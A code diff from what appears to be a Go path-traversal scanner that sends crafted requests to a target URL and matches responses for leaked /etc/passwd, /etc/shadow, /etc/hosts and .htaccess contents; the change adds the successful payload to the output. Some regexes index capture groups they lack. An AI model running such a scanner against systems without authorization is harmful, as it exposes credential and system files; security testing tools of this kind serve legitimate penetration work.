@@ -145,37 +145,37 @@ func validateURL(url string) {
 
 }
 
-func findETCPasswd(response string) {
+func findETCPasswd(response string, requestPattern string) {
 	etcPasswd := regexp.MustCompile(`root:(.*)\s\w(.*)`)
 	matchEtcPasswd := etcPasswd.FindStringSubmatch(response)
 	if len(matchEtcPasswd) != 0 {
-		fmt.Printf(utils.SetColorGreen("---> [+] ETC/PASSWD FOUND: %s\n "), matchEtcPasswd[1])
+		fmt.Printf(utils.SetColorGreen("---> [+] ETC/PASSWD FOUND: %s : payload: %s \n"), matchEtcPasswd[1], requestPattern)
 
 	}
 }
 
-func findETCHosts(response string) {
+func findETCHosts(response string, requestPattern string) {
 	etcHosts := regexp.MustCompile(`(?m)^\s*([0-9.:]+)\s+([\w.-]+)`)
 	matchEtcHosts := etcHosts.FindStringSubmatch(response)
 	if len(matchEtcHosts) != 0 {
-		fmt.Printf("---> [+] ETC/HOSTS: %s\n", matchEtcHosts[1])
+		fmt.Printf("---> [+] ETC/HOSTS: %s : payload: %s \n", matchEtcHosts[1], requestPattern)
 	}
 }
 
-func findHtAcess(response string) {
+func findHtAcess(response string, requestPattern string) {
 	htAcess := regexp.MustCompile(`AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile|IfModule`)
 	matchHtAcess := htAcess.FindStringSubmatch(response)
 	if len(matchHtAcess) != 0 {
-		fmt.Printf("---> [+] HTACESS FOUND: %s\n", matchHtAcess[1])
+		fmt.Printf("---> [+] HTACESS FOUND: %s payload: %s \n", matchHtAcess[1], requestPattern)
 	}
 
 }
 
-func findetcShadow(response string) {
+func findetcShadow(response string, requestPattern string) {
 	etcShadow := regexp.MustCompile(`^[a-z0-9][a-z0-9]*::`)
 	matchShadow := etcShadow.FindStringSubmatch(response)
 	if len(matchShadow) != 0 {
-		fmt.Printf("---> [+] ETC/SHADOW FOUND: %s", matchShadow[1])
+		fmt.Printf("---> [+] ETC/SHADOW FOUND: %s \n payload: %s ", matchShadow[1], requestPattern)
 	}
 
 }
@@ -216,10 +216,10 @@ func main() {
 					requestPattern := *url + fullPattern
 					response := sendRequests(requestPattern, *cookies)
 
-					go findETCPasswd(response)
-					go findETCHosts(response)
-					go findHtAcess(response)
-					go findetcShadow(response)
+					go findETCPasswd(response, requestPattern)
+					go findETCHosts(response, requestPattern)
+					go findHtAcess(response, requestPattern)
+					go findetcShadow(response, requestPattern)
 
 				}
 			}
